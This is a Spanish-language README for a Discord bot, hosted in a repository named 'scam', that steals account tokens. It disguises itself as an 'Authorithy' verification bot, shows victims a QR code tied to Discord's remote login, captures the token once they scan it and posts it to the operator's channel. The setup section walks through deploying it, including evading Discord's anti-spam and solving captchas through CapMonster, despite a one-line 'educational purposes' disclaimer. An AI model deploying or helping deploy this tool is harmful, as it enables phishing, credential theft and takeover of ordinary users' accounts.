(https://imgur.com/a/p7LPy0Z)

## Features

- **Se ve exactamente como un bot real.** (cuando se configura eficientemente)
- **memoria eficiente.** (no usa chromedriver.exe o cualquier buscador)
- **muy estable y robusto.** (crasheos y bugs minimos)
- **el único metodo funcional** (que no usa chromedriver.exe)

## Disclaimers

- Este es un bot que no está afiliado a ninguno de los equipos de Discord o Discord Inc.
- Esto fue hecho con fines educativos. No está destinado a ser utilizado con fines maliciosos.
- Cualquier uso de este bot es bajo su propio riesgo. Ni yo ni tfa nos hacemos responsable de los daños que puedan ocurrir.
- Debe tener una cuenta <a href="https://capmonster.cloud">CapMonster</a> con fondos para un rendimiento óptimo.

## How it works

- El bot usa un socket web para conectarse a la API de Discord para recuperar una sesión de inicio de sesión.
- La sesión de inicio de sesión luego envía al bot una URL para generar un código QR para que el usuario lo escanee.
- Después de que el usuario escanee el código QR, el bot recuperará el token y lo enviará a un canal.

## Setup

- **Prerequisitos de instalación** Los necesitarás para poder ejecutar el bot de discord.
  - [Node LTS](https://nodejs.org/en/)
  - [Git](https://git-scm.com/downloads)
- **Clonar el repositorio e instalar dependencias**
  - `git clone https://github.com/ulnk/scam.git`
  - `npm install`
- **Crear un nuevo bot de Discord**
  - **Habilitar todos los intentos para el bo** Esto es muy importante. Si no habilita todos los intentos, el bot no funcionará.
    - https://discord.dev **Bot** > **Privileged Gateway Intents**
  - **Para mejores resultados** Discord tiene un sistema antispam que deshabilitará cualquier bot sospechoso. Para evitar esto, lo mejor es utilizar los recursos proporcionados que se encuentran [here](https://github.com/ulnk/scam/tree/main/profile). 
Para que encaje con el perfil, cambie el nombre del bot a 'Authorithy' y configure la imagen de perfil como la proporcionada.
  - **Invita el bot a tu server** Use el enlace a continuación para invitar a su bot a su servidor. Cambie `CLIENTID` a su ID de cliente de discord bots.
    - Para obtener la identificación del cliente para su bot > https://discord.dev **Oauth2** > **General**
    - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
- **Configurar el proyecto**
  - Cambie el nombre de `default-config.json` a `config.json`. Esto se encuentra en `src/default-config.json`.
  - `Edite todas las claves y sus valores. No se requiere dar un valor a capmonster, sin embargo se recomienda`.
  - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash
Al ingresar `log.guildId` y `log.channelId`, debe ingresar la identificación del servidor y el canal en el que se encuentra el bot. De lo contrario, el bot no podrá enviar el token y se bloqueará..
- **Iniciar el bot**
  - `npm run start`
  - Una vez que el bot esté activo, use el comando `/spawn` para generar el mensaje de verificación.

(_single executable file coming soon_)

### librerias usadas

- **discord.js** (dbot de discord) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
- **crypto** (Keys privadas y Keys públicas) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
- **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
- **jimp** (editación de imagenes para discord.js) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
- **capmonster** (anti-captcha)<img alt="preview badge" src="https://img.shields.io/npm/v/node-capmonster">

https://discord.gg/wKn7VJ5R support server `MADE BY TFA CO. DO NOT STEAL`
